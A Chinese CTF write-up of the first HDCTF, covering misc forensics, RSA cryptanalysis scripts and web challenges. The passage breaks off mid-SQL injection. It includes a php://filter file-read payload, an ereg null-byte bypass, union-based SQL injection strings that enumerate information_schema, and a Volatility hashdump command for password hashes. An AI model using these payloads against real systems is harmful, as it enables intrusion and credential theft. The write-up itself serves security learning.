
# 第一届HDCTF Write up


                                阅读量   
                                **527581**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">12</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t015d15d1f330301d80.jpg)](https://p0.ssl.qhimg.com/t015d15d1f330301d80.jpg)



有幸参与海南大学组织举办的第一届HDCTF，听说难度中等偏易，刚刚入手CTF的我认为这是一次很好的练习以及学习机会。便兴冲冲的参与啦！



## MISC

首先，自认为misc是最容易的（相对web、rev、pwn来说，也不把今年的国赛MISC考虑在内。。。）便先拿MISC开刀（签到题就不说了23333）

### <a class="reference-link" name="%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E7%A0%81%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%20100"></a>循环冗余码了解一下 100

题目描述：xx 同学用他的 QQ 号加密了压缩包，你能成功破解出并找到数据包中的秘密吗？

下载文件得到两个加密压缩包：enc.rar与qq.rar

循环冗余码，CRC32，然后题目说密码是QQ号，

[![](https://p0.ssl.qhimg.com/t013621338a8e13cb42.png)](https://p0.ssl.qhimg.com/t013621338a8e13cb42.png)

从包里可以看到是8位QQ号，很自然的可以想到是CRC碰撞了，虽然超过6个字节的内容CRC碰撞就不合适了，不过已经知道内容是八位数字，那就很容易写脚本碰撞了，以下是py2脚本

```
import binascii
for a in range(10):
    for b in range(10):
        for c in range(10):
            for d in range(10):
                for e in range(10):
                    for f in range(10):
                        for g in range(10):
                            for h in range(10):
                                txt= str(a)+str(b)+str(c)+str(d)+str(e)+str(f)+str(g)+str(h)
                                crc = binascii.crc32(txt)
                                if ((crc &amp; 0xFFFFFFFF)==0xE82D0FCC):
                                    print txt
```

运行得到：

[![](https://p4.ssl.qhimg.com/t010d3e7d351c7d6b74.png)](https://p4.ssl.qhimg.com/t010d3e7d351c7d6b74.png)

输入密码拿到一份流量包，流量包分析，wireshark打开，追踪TCP流，一条一条查看过去

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b632cff440a7bcd5.png)

拿到一条被加密的flag：

```
V20xNGFGb3pkR2hOUkdoc1RUSk5lazFFVlRCTk1scG9XbFJGZDAxSFdtMU9WMDB5V2xSTk5WcEVTWGxhUkVFeldrZ3dQUT09
```

虽然末尾没有等于号那么明显的标志，但base64应该八九不离十，最后通过三次base64解密后get flag：

flag{a08e3c30543fae100ff5c6e39d22d07d}

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

考点：压缩包解密之CRC碰撞；流量包分析；base64。

总的来说这一题不算太难，还是偏新手向的，稍微会一点点python，然后搜索一下python中关于crc的方法便能轻易构造脚本。流量包分析也是套路追踪TCP流，至于最后base64显然不难猜。

### <a class="reference-link" name="%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%20150"></a>信号分析 150

题目描述：xx同学使用 hackcube 截获到了一段停车杆的遥控信息，你能还原这个原始信号吗？flag格式：flag{md5(得到的信号格式)}

提示：

hint1：参考：[https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=13&amp;extra=page%3D1](https://unicorn.360.com/hackcube/forum.php?mod=viewthread&amp;tid=13&amp;extra=page%3D1)

hint2：试试波形分析吧！ Audacity

下载得到一个.wav文件，拖进 Audacity观察，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013898b318dcfaa13a.png)

在波形（dB）（W）下可以看到如此波形，由于没接触过遥控信息，进入所给参考资料，

根据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011ad7073e2d66bc28.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f8cb47a05d83bef7.png)

即可知道题目所给文件中的波形的含义为：FFFFFFFF0001

再根据flag格式，get flag：flag{a2720cc18b1410daaf83555eb262387a}

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

在给了参考资料，以及hint2的情况下，本题难度大大降低，主题人可能想通过本题让答题人了解接触遥控信号这一块吧？

### <a class="reference-link" name="%E4%BD%A0%E8%83%BD%E5%8F%91%E7%8E%B0%E4%BB%80%E4%B9%88%E8%9B%9B%E4%B8%9D%E9%A9%AC%E8%BF%B9%E5%90%97%20200"></a>你能发现什么蛛丝马迹吗 200

题目描述：xx 同学在某处得到了一个神秘的镜像文件，你能帮他发现一些神秘的信息吗？

提示：1. Volatility 2. 关键词 flag

下载得到一份镜像文件，用kali下的Volatility进行分析，

首先查看文件的profile值

指令：volatility -f memory.img imageinfo

[![](https://p2.ssl.qhimg.com/t0122edb9bf568992ca.png)](https://p2.ssl.qhimg.com/t0122edb9bf568992ca.png)

猜测profile值为Win2003SP1x86

然后查看一下进程

指令：volatility -f memory.img —profile=Win2003SP1x86 pslist

[![](https://p4.ssl.qhimg.com/t014d9cc1b60f91d76a.png)](https://p4.ssl.qhimg.com/t014d9cc1b60f91d76a.png)

发现一个及其显眼的最近程序的DumpIt.exe，感觉有点蹊跷，

然后试着提取内存中保留的 cmd 命令使用情况

指令：volatility -f memory.img —profile=Win2003SP1x86 cmdscan

[![](https://p4.ssl.qhimg.com/t01075885983a819e77.png)](https://p4.ssl.qhimg.com/t01075885983a819e77.png)

看见Flags字样，根据提示，这个程序一定有点问题，找到他的PPID把他dump下来

指令：volatility -f memory.img —profile=Win2003SP1x86 memdump -p1992 -D /root

[![](https://p4.ssl.qhimg.com/t017bdd90201e5d81a8.png)](https://p4.ssl.qhimg.com/t017bdd90201e5d81a8.png)

得到1992.dmp文件，然后用foremost提取里面的文件

指令：foremost 1992.dmp -T

[![](https://p5.ssl.qhimg.com/t01d8376afd89bd6490.png)](https://p5.ssl.qhimg.com/t01d8376afd89bd6490.png)

分离出来很多文件，在其中的png文件夹中发现四张图像（重复了其实）二维码扫出来内容是：

jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=

第一眼以为是base64，随即试了一下，解出来是乱码，然后根据上图的key以及iv，应该是AES加密，找到一个在线解AES的网址：[http://tool.chacuo.net/cryptaes](http://tool.chacuo.net/cryptaes)<br>[![](https://p3.ssl.qhimg.com/t01a20bb6632db24aa8.png)](https://p3.ssl.qhimg.com/t01a20bb6632db24aa8.png)

昂吭，get flag！flag{F0uNd_s0m3th1ng_1n_M3mory}

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

这一题考的是内存取证，主要是对volatility工具的使用吧，然后是一个AES的ECB解密，

下面总结整理一下对volatility工具的使用方法

第一步肯定是需要查看文件的profile值：volatility -f memory.img imageinfo

然后就可以有很多操作了，比如列举进程：volatility -f memory.img —profile=Win2003SP1x86 pslist

cmd 命令使用情况：volatility -f memory.img —profile=Win2003SP1x86cmdscan

列举缓存在内存的注册表 ：volatility -f memory.img —profile=Win2003SP1x86 hivelist

打印出注册表中的数据 ：volatility -f memory.img —profile=Win2003SP1x86 -o 注册表的 virtual 地址

将内存中的某个进程数据以 dmp 的格式保存出来 ：volatility -f memory.img —profile=Win2003SP1x86 memdump -p 进程的PPID值 -D 保存文件的地址

获取到当时的网络连接情况：volatility -f memory.img —profile=Win2003SP1x86 netscan

获取内存中的系统密码：volatility -f memory.img —profile=Win2003SP1x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址） #这在H-GAME的week4中的warm up有用到

除了这些常用到的功能以外，volatility工具还有更多的功能，这里就不在再一一列举了，具体可以使用指令：volatility -h 查看

（这其实是打HGAME整理的，主要参考[https://www.jianshu.com/p/6438bc3302c8）](https://www.jianshu.com/p/6438bc3302c8%EF%BC%89)



## CRYPTO

哇，中等偏易的HDCTF的密码学全是RSA，硬核啊，不过倒也是RSA里面偏简单的，可以接受，因为之前HGAME也遇到RSA了，所以留下的脚本，刚好对付这里的RSA了。

### <a class="reference-link" name="basic%20rsa%2050"></a>basic rsa 50

题目描述：这可能是最最最最简单的 rsa 了<br>
密文：27565231154623519221597938803435789010285480123476977081867877272451638645710

下载得到一份py2代码

```
import gmpy2
from Crypto.Util.number import *
from binascii import a2b_hex,b2a_hex

flag = "*****************"

p = 262248800182277040650192055439906580479
q = 262854994239322828547925595487519915551

e = 65533
n = p*q


c = pow(int(b2a_hex(flag),16),e,n)

print c
```

呃，啥都知道了，上脚本解呗

```
import gmpy2
from libnum import n2s,s2n

c = gmpy2.mpz(9544552122426002996962843810441848397036784063191487784065817764908998519819)
p = gmpy2.mpz(262248800182277040650192055439906580479)
q = gmpy2.mpz(262854994239322828547925595487519915551)
e = gmpy2.mpz(65533)
phi_n = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)     #自认为gmpy2的神级功能之一；    
m = pow(c,d,p*q)
print "plaintext:"
print hex(m)[2:].decode('hex')
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01211dc77589ae8098.png)

get flag：flag{B4by_Rs4}

### <a class="reference-link" name="bbbbbbrsa%20100"></a>bbbbbbrsa 100

题目描述：babyrsa，还是一道 RSA 的题目~

下载得到一份py2代码：

```
from base64 import b64encode as b32encode
from gmpy2 import invert,gcd,iroot
from Crypto.Util.number import *
from binascii import a2b_hex,b2a_hex
import random

flag = "******************************"

nbit = 128

p = getPrime(nbit)
q = getPrime(nbit)
n = p*q

print p
print n

phi = (p-1)*(q-1)

e = random.randint(50000,70000)

while True:
    if gcd(e,phi) == 1:
        break;
    else:
        e -= 1;

c = pow(int(b2a_hex(flag),16),e,n)

print b32encode(str(c))[::-1]
```

和一份enc文件

```
p = 177077389675257695042507998165006460849
n = 37421829509887796274897162249367329400988647145613325367337968063341372726061
c = ==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM
```

呃，小tricks，将c逆序后base64解密得到十进制c：

```
import base64
c='==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM'
print(base64.b64decode(c[::-1]))


&gt;&gt;&gt;b'2373740699529364991763589324200093466206785561836101840381622237225512234632'
```

然后，继续看这题的代码，这个e真是有点东西啊，取随机数然后再自减至与欧拉函数互质？这，我能想到的只能是爆破了23333，构造脚本：

```
import random
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        return 404            #因为20000个数中不是每个e都能求出d，所以这里对求d报错时进行了简单处理
    else:
        return x % m
fw=open("plaintext.txt","w")
p = 177077389675257695042507998165006460849
q = 211330365658290458913359957704294614589
n = 37421829509887796274897162249367329400988647145613325367337968063341372726061
c  = 2373740699529364991763589324200093466206785561836101840381622237225512234632
phi=(p-1)*(q-1)
for e in range(50000,70000):
        d=modinv(int(e),(p-1)*(q-1))
        if(d==404):
                continue
        else:
                fw.writelines(hex(int(pow(c,d,p*q))))
                fw.writelines("n")
```

运行结束后得到文本，然后再记事本中ctrl-F搜索666C6167（flag的十六进制形式），得到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018eb2d76caaa9f1d2.png)

在十六进制转换过去得到flag：flag{rs4_1s_s1mpl3!#}

### <a class="reference-link" name="together%20200together%20200"></a>together 200together 200

题目描述：又是一道 RSA

这一题有四个文件，分别是myflag1，myflag2，pubkey1.pem，pubkey2.pem

打开myflag1，myflag2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011c67bc8732eb341f.png)

base64解码成16进制后得到两份数据

分别是数据1：0x477368cbaaf758b22dcad0266f81661c4ca0a2296e7041196cef59617c7924dd371cda412c3c7b7d77767e5f942f9fb5d510acff2d2a953194456583b46eba78d2f31b036900a8958fa23b46d5099763dc9b736f15e005c08f54b15444ca1ef3215eac23d64ff25ff61950e8acb033e542d6f9fd0e20d1a1266666f052ff6839e57d3125850f3b2cf89c5a95d8a0cb72afa5abc632ba3a7b67f01a82b7412343b4de5d9871207f554cf5a30e615d98ea9aa9d5484fe2d97a64e02cd112c0ce679f88394b76850c5c23d58883625d3ffbc7adbca7ceadfa0a3b04740b1b111da830754513112f047072e63060b10a40d99f74b39a603a35bde580b792806f0fd4<br>
数据2：0x3bead109723769307a3f5ad820e3d475a954a7aba3a7012ae08db40a8580f8720bf31c46b6a63a379829af482e66ff5980e1003059c1c4ea8c75536707d1a09e1997b6dd595b274fa88707be57f0a5dfcbc9dd174a35e78dacf73f7bce42f47bd5c0ffb97c810345cfce69d320c80486e1895459bc9a29f42ffdaa23bc20fd9ef0d7ee263a68bae792485de0a21b6dee903bfa97d6d9baa7c6bd609ad4a2975833f7d672dba7464dda86d4b3a8c401ad6a553697e8ce0ccbeb24b3ed15bc7013ac052e0ab98cc15122bea209fe74baca619511137a3a19f3cabd7af249c404a3958f41403b1dd82dfa6930cf976ce1877aa74a2512e932fa855c33064089d3df

然后再看两份.pem文件，这个需要用到kali里的openssl工具，

分别输入指令：

openssl rsa -pubin -text -modulus -in warmup -in pubkey1.pem

openssl rsa -pubin -text -modulus -in warmup -in pubkey2.pem

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c636c5c8c397f305.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a547bca31e7fbfef.png)

获得

e1:0x91d

e2:0x5b25

N1:75A8B8AA2AD2950E9AED4BE34618DFBEABB8CBA832685CC94F45173330100624846CCF90F3C2DB75BA5AF4B39CAEF1175AB9F898794EAC6082A4F766F7CB280B16F6980B38DDA811761324D619513B3CBE65877ACF51FC70405A8347C121207E71F8E6FCAE39647ED2231D306DD53849257BC306E997A502867012249D1691F5DC11D6AF06539F3F808939343DDE09301A761AE12C1C969076C502BC5A971E10ABCB366547BC94373F37A57DDC43858DB29BAAAAAD0E6867885EA3757403008C164E9C7AFA39B3C65089A151DDD8C06C64271086F9255ADB8ACF82182F8FA252930A187961635BC2A85C761330F85C896314B3FDAE4EFEF7E0A8C93B8854BFC3

N2:75A8B8AA2AD2950E9AED4BE34618DFBEABB8CBA832685CC94F45173330100624846CCF90F3C2DB75BA5AF4B39CAEF1175AB9F898794EAC6082A4F766F7CB280B16F6980B38DDA811761324D619513B3CBE65877ACF51FC70405A8347C121207E71F8E6FCAE39647ED2231D306DD53849257BC306E997A502867012249D1691F5DC11D6AF06539F3F808939343DDE09301A761AE12C1C969076C502BC5A971E10ABCB366547BC94373F37A57DDC43858DB29BAAAAAD0E6867885EA3757403008C164E9C7AFA39B3C65089A151DDD8C06C64271086F9255ADB8ACF82182F8FA252930A187961635BC2A85C761330F85C896314B3FDAE4EFEF7E0A8C93B8854BFC3

连个N一样的？同样的N，不同的e，那么是RSA的共模攻击没错了，那么之前获得的应该是两个密文了，构造共模攻击的脚本：

```
from gmpy2 import iroot,invert

n = 0x75a8b8aa2ad2950e9aed4be34618dfbeabb8cba832685cc94f45173330100624846ccf90f3c2db75ba5af4b39caef1175ab9f898794eac6082a4f766f7cb280b16f6980b38dda811761324d619513b3cbe65877acf51fc70405a8347c121207e71f8e6fcae39647ed2231d306dd53849257bc306e997a502867012249d1691f5dc11d6af06539f3f808939343dde09301a761ae12c1c969076c502bc5a971e10abcb366547bc94373f37a57ddc43858db29baaaaad0e6867885ea3757403008c164e9c7afa39b3c65089a151ddd8c06c64271086f9255adb8acf82182f8fa252930a187961635bc2a85c761330f85c896314b3fdae4efef7e0a8c93b8854bfc3

def egcd(a, b):

    if a == 0:

        return (b, 0, 1)

    else:

        g, y, x = egcd(b % a, a)

        return (g, x - (b // a) * y, y)



c1 = 0x477368cbaaf758b22dcad0266f81661c4ca0a2296e7041196cef59617c7924dd371cda412c3c7b7d77767e5f942f9fb5d510acff2d2a953194456583b46eba78d2f31b036900a8958fa23b46d5099763dc9b736f15e005c08f54b15444ca1ef3215eac23d64ff25ff61950e8acb033e542d6f9fd0e20d1a1266666f052ff6839e57d3125850f3b2cf89c5a95d8a0cb72afa5abc632ba3a7b67f01a82b7412343b4de5d9871207f554cf5a30e615d98ea9aa9d5484fe2d97a64e02cd112c0ce679f88394b76850c5c23d58883625d3ffbc7adbca7ceadfa0a3b04740b1b111da830754513112f047072e63060b10a40d99f74b39a603a35bde580b792806f0fd4

c2 = 0x3bead109723769307a3f5ad820e3d475a954a7aba3a7012ae08db40a8580f8720bf31c46b6a63a379829af482e66ff5980e1003059c1c4ea8c75536707d1a09e1997b6dd595b274fa88707be57f0a5dfcbc9dd174a35e78dacf73f7bce42f47bd5c0ffb97c810345cfce69d320c80486e1895459bc9a29f42ffdaa23bc20fd9ef0d7ee263a68bae792485de0a21b6dee903bfa97d6d9baa7c6bd609ad4a2975833f7d672dba7464dda86d4b3a8c401ad6a553697e8ce0ccbeb24b3ed15bc7013ac052e0ab98cc15122bea209fe74baca619511137a3a19f3cabd7af249c404a3958f41403b1dd82dfa6930cf976ce1877aa74a2512e932fa855c33064089d3df

e1 = 2333

e2 = 23333

s = egcd(e1,e2)

s1 = s[1]

s2 = s[2]

if s1&lt;0:

    s1 = - s1

    c1 = invert(c1, n)

elif s2&lt;0:

    s2 = - s2

    c2 = invert(c2, n)

m = pow(c1, s1, n) * pow(c2, s2, n) % n

print hex(m)[2:].decode('hex')
```

运行得到：

[![](https://p3.ssl.qhimg.com/t011cd8c74c1986d7c3.png)](https://p3.ssl.qhimg.com/t011cd8c74c1986d7c3.png)

get flag：flag{23re_SDxF_y78hu_5rFgS}

（脚本构造参考V爷爷博客：

[https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/#more）](https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/#more%EF%BC%89)

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

这次比赛的密码学，相比于出脑洞古典密码，直接三道RSA还是比较硬核了，做了这三道题，又再一次温习了RSA的加密原理以及脚本构造，还是有所收获的。



## WEB

### <a class="reference-link" name="%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0HDCTF%2050"></a>欢迎来到HDCTF 50

题目描述：签到题

呃，签到题，那f12一下咯？

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t018e6cb404b6c06888.png)

没什么端倪，那就按照描述改0.html为1.html吧

[![](https://p2.ssl.qhimg.com/t01a9b35303dee584b0.png)](https://p2.ssl.qhimg.com/t01a9b35303dee584b0.png)

呃，将段落一级一级展开最终get flag：flag{welcome_t0_HDctf}

测试你与flag的缘分 100

题目描述：常规编码啦

进入页面

[![](https://p0.ssl.qhimg.com/t011b0ecac96cd085f0.png)](https://p0.ssl.qhimg.com/t011b0ecac96cd085f0.png)

呃，对不对不敢保证，，，，呃，还是点进去吧，

[![](https://p2.ssl.qhimg.com/t016741ba0bfa67fd3c.png)](https://p2.ssl.qhimg.com/t016741ba0bfa67fd3c.png)

得到一份jsfuck编码的文件，这个Google自带解码功能，f12后，放进控制台跑就好，得到

[![](https://p2.ssl.qhimg.com/t01c6c56268962a1119.png)](https://p2.ssl.qhimg.com/t01c6c56268962a1119.png)

十六进制转字符串后得到

=E5=93=88=E5=93=88=E5=93=88=E5=93=88,=E4=BD=A0=E8=A2=AB=E9=AA=97=E4=BA=86,=<br>
=E4=B8=8D=E6=98=AF=E8=BF=99=E4=B8=AA,=E5=B0=B1=E9=97=AE=E4=BD=A0=E8=A7=A3=<br>
=E4=BA=86=E5=8D=8A=E5=A4=A9=E6=B0=94=E4=B8=8D=E6=B0=94

呃？是这啥？随便复制一段百度搜索，知道是QUOTED-PRINTABLE编码，找到在线解密网址解密得到：

[![](https://p0.ssl.qhimg.com/t01219ecdc098407c32.png)](https://p0.ssl.qhimg.com/t01219ecdc098407c32.png)

wtf？啥玩意儿，这么整的嘛？回到最初页面，f12大法！发现

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01907713f63c2f4e43.png)

（此处暴打出题人）

将图中十六进制转为字符串，然后两次base64解码得到flag

HDCTF{Jsfuck_1s_l0vely!}

这是web题吗？最后才发现网页标题已经说了，

[![](https://p0.ssl.qhimg.com/t0156183575f131110a.png)](https://p0.ssl.qhimg.com/t0156183575f131110a.png)

ok fine…

### <a class="reference-link" name="%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%20200"></a>简单的代码审计 200

这一题有点意思。。

进入页面，啥也没有，老样子，f12大法，

[![](https://p5.ssl.qhimg.com/t013925bed13eff04ad.png)](https://p5.ssl.qhimg.com/t013925bed13eff04ad.png)

发现hint：file=once.php

于是在网址栏键入?file=once.php

[![](https://p0.ssl.qhimg.com/t01c48e1fc776a6bbca.png)](https://p0.ssl.qhimg.com/t01c48e1fc776a6bbca.png)

进入页面

[![](https://p2.ssl.qhimg.com/t01839e0363fa80b448.png)](https://p2.ssl.qhimg.com/t01839e0363fa80b448.png)

这，难道要爆破？不对劲，结合题目：代码审计，这题应该有代码才对，在看看hint，发现是file=once.php，这个file，那么源代码中应该存在文件包含函数，也就想到php伪协议中的任意文件读取，于是键入：

```
http://149.28.22.177:10003/?file=php://filter/read=convert.base64-encode/resource=once.php
```

得到网页经base64编码后的源码，base64解码后再处理一下格式，得到：

```
&lt; html &gt; &lt; head &gt; &lt; meta http - equiv = "content-type"
content = "text/html; charset=GBK" &gt; &lt; title &gt; Once More &lt; /title&gt;  &lt;/head &gt; &lt; body &gt; &lt; br &gt; &lt; center &gt; &lt; p &gt; You password must be alphanumeric &lt; /p&gt;&lt;br&gt;  &lt;form method="get"&gt;   &lt;input type="text" name="password" placeholder="Password"&gt;&lt;br&gt;&lt;br&gt;   &lt;input type="submit" value="Check"&gt;  &lt;/form &gt; &lt; hr &gt; &lt; br &gt; &lt; /body&gt;&lt;/html &gt; 


&lt;? php error_reporting(0);
include_once('./flag/flag0.php');
if (isset($_GET['password'])) {
    if (ereg("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE) {
        echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;';
    } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 999999999) {
        if (strpos($_GET['password'], '*-*') !== FALSE) {
            die('Flag: '.$flag);
        } else {
            echo('&lt;p&gt;*-* have not been found&lt;/p&gt;');
        }
    } else {
        echo '&lt;p&gt;Invalid password&lt;/p&gt;';
    }
} ?&gt;
```

果然是审计代码，一步步来，首先输入密码，密码需满足条件：

1，有字母或者数字组成；

2，密码长度小于8，却要比999999999大；

3，密码需要蕴含**–**。

矛盾点1：密码长度小于8，要比9个9大，这里可以用科学计数法绕过，比九个九大的最小值就是十亿，即1e9。

矛盾点2：密码只能由字母或者数字组成，却要包含符号：**–**，这里了解到php的ereg函数存在截断漏洞，可以用%00来截断参数，绕过验证

故密码为：1e9%00**–**

输入密码后，仍然错误：

[![](https://p3.ssl.qhimg.com/t017a05d636e90632db.png)](https://p3.ssl.qhimg.com/t017a05d636e90632db.png)

我们注意到我们的密码被改为了1e9%2500**–**

因为浏览器在处理时会自动将我们传的参数url解码一次

那么直接在URL上操作，

最后payload：

```
http://149.28.22.177:10003/once.php?password=1e9%00*-*
```

get flag：HDCTF{Is_V3ry_1nteresting!}

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

这道题考的知识点还是蛮多的。1：通过文件包含漏洞利用php伪协议中的任意文件读取；2：php的ereg函数的截断漏洞利用；3：浏览器会自动进行一次url解码（实验吧的PHP大法一题了解一下。。）4：科学计数法。

可能刚接触CTF没了解太多的新手真的会把这题当做密码爆破来做吧。

### <a class="reference-link" name="sql%E6%B3%A8%E5%85%A5%20300"></a>sql注入 300

进入页面，是个登录界面，吸取第二题教训，直接f12，果然有点东西。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f034e1ed521ff0e5.png)

试试hash？

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01656b94e1f6326bd5.png)

点击用户登录，呃，看来这里有脑洞了。是4位数字吗？一个反问。那就不是了，结合hint：试试hash，那么密码可能是一个四位数字的hash值吧，可是hash加密第一堆堆啊，猜最常见的md5吧，不对就再换好了，反正应该是离不开爆破了。用因为burpsuit里的process刚好有hash爆破，就用它爆破了，最后爆破出结果，发现密码是2019的md5值，

[![](https://p0.ssl.qhimg.com/t0115a6237eac81b8db.jpg)](https://p0.ssl.qhimg.com/t0115a6237eac81b8db.jpg)

输入密码后进入：

[![](https://p3.ssl.qhimg.com/t018dc3589fb27e0c14.png)](https://p3.ssl.qhimg.com/t018dc3589fb27e0c14.png)

首先测试，发现空格（可用/**/代替），等号（”where = “语句为非法）被过滤，但是union 和 select没有被过滤。那么这题这么解。

首先匹配字段，发现到3没有报错

```
'/**/union/**/select/**/1,2,3#
```

了解到由于Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息，所以，

同时爆库名和表名

```
'/**/union/**/select/**/1,TABLE_NAME,TABLE_SCHEMA/**/from/**/information_schema.TABLES#
```

[![](https://p4.ssl.qhimg.com/t01a19a17102a1e753f.png)](https://p4.ssl.qhimg.com/t01a19a17102a1e753f.png)

